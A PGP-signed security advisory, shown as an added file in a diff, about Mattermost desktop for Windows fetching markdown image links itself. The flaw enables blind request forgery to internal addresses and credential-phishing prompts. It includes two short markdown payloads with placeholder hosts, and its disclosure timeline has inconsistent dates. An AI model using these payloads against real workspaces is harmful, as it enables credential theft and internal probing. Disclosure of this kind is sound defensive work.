@@ -1,0 +1,112 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+
+
+1. Advisory information
+- - - - -----------------
+
+Title: Mattermost desktop for Windows credential capture and limited SSRF
+Advisory reference: BLAZE-01-2020
+Product: Mattermost desktop for Windows
+Disclosure mode: Forced
+
+
+2. Product description
+- - - - ----------------
+
+Mattermost is a flexible, open source messaging platform that enables secure team collaboration.
+The product is used in several enterprises as a self-hosted, on-premise alternative to Slack and other
+messaging workspace.
+
+According to Mattermost, it is "so secure that influential countries use it as a safeguard to national security."
+
+Organizations that use Mattermost include Daimler, Intel, Uber, CERN, Bosch, NASA's JPL, Samsung, Valve.
+(for more customers see https://mattermost.com/customers/)
+
+
+3. Vulnerability details
+- - - - ------------------
+
+As part of its rich features, Mattermost performs previews of links and images when they are sent in public and private
+channels as well as private chats. Part of the preview is done by the self-hosted Mattermost instance, and link preview can
+be disabled in server-side.
+
+However, by default Mattermost does render markdown. Therefore, even when the link preview functionality is disabled in
+the server the client will do something similar to preview via markdown.
+
+Unlike other messenger platforms, when doing previews of links or rendering markdown from messages coming from other individuals
+in the same workspace or team, the Mattermost client of the user receiving the message will fetch the link itself.
+
+This feature can be abused in two different ways, without any user interaction:
+
+1) Client-Side Request Forgery (SSRF)
+
+As the receiving user's client will also perform a request, it can be abused to leverage a condition for blind SSRF.
+The following payload ![test](http://internal_ip/?parameter=value) will make any Mattermost client receiving the message
+to issue a HTTP request to an internal IP address with an attacker's chosen parameter.
+
+Under certain circumstances, this issue could be leveraged into malicious attacks.
+
+
+2) Capture of credentials (Windows desktop client only)
+
+Again as the client will perform the request to an arbitrary HTTP or HTTPS address, if the resource to be fetched is behind
+a HTTP Auth Basic, Mattermost desktop for Windows will launch a prompt requesting for username and password, without any
+additional security warning or user interaction required.
+
+The following payload could be used to achieve this scenario:
+![test](http://ip_address/resource_behind_httpauthbasic)
+
+This makes a case for extremely convincing phishing attacks against all users in a channel using Mattermost desktop
+for Windows. A rogue user within an organization could write a message to a public channel and will most likely capture
+several credentials from unsuspecting users. These credentials could later be used to impersonate the victim and have
+access to private channels they have access to or obtain their chat history.
+
+PS: Mattermost's internal security team discovered the issue that could lead to phishing independently and fixed it
+on version v4.4.0.
+
+
+4. Fix and recommendations
+- - - - --------------------
+
+Upgrade Mattermost to version v4.4.0.
+
+
+5. Credits
+- - - - ----
+
+This vulnerability was discovered and researched by Julio Cesar Fort from
+Blaze Information Security (https://www.blazeinfosec.com)
+
+
+6. Disclosure timeline
+- - - - ----------------
+
+03/12/2020: Vulnerability discovered when inspecting the markdown renderer of the product
+12/12/2019: Further research indicated the issue is only present on Mattermost for Windows
+28/05/2020: Advisory released
+
+
+7. References
+- - - - -------
+
+https://mattermost.com/security-updates/
+
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEE21PZ2fDh5RNPUoIZwzvH+sXQ6SYFAl7P0g0ACgkQwzvH+sXQ
+6SZ3CxAA0X0Fza2ycmqr4Lcuy2tF45A08cVe0Vbq3U9V1Ngt9doYFERUtitW/+to
+zQXfji+Far+7Vhfhu8IR3pZvPw+aPc1AYcaXD3TDLaunacsb5OHEdbvyn1aEcpXZ
+wiUNQYiZfQXshKADpceqytxVtLU1quK6S0feGNqAH+nUX5C//H2xH6N62lBdabJ1
+KiScQZwQ6fG7eu3vgYTm54yJps+ZY1kznUk1DH3jSM69IcUUQAEC4fTp44dkjnFf
+rL1QGdguE3FpvVpWAVX/5ofj5VMv6DUmT26OF3WJqKGIq1v+uHWisCzj9iQqSt2C
+KGp9SuO9FY536xivtXvg+FSVWq31tPrzNnEh/zmPbJriO+O2z0trpG6pbz7HZgaY
+niu57aDMWBX0499I0OHEZeT2ww5LaoJWS0e4wCtql2NZw+TbDvWSYZlbxR2FuE9y
+LvuVwPu6K8SyrNHejNNfD1Oe9ufAmU7a+PCXL3zF8Z0eB9Qq5I1QiLuUMxWzvB4t
+Gr7MuP+1QMIllUxQ6nHGUmMO4vhx9OhYeOkwfANpbzU6hMx+VaXqR41636vGG0uC
+KQanvNwmxH2cRM5KmgXD+KkVKBrQGRNhPOxs+jsMcmwsxmNk1W/Z2//WJwLKGUU3
+ec/6JdbByR3mbnWa83MsNj0JuaI/bfuOEWJhyE6qkiIF/P7zb28=
+=DTqG
+-----END PGP SIGNATURE-----
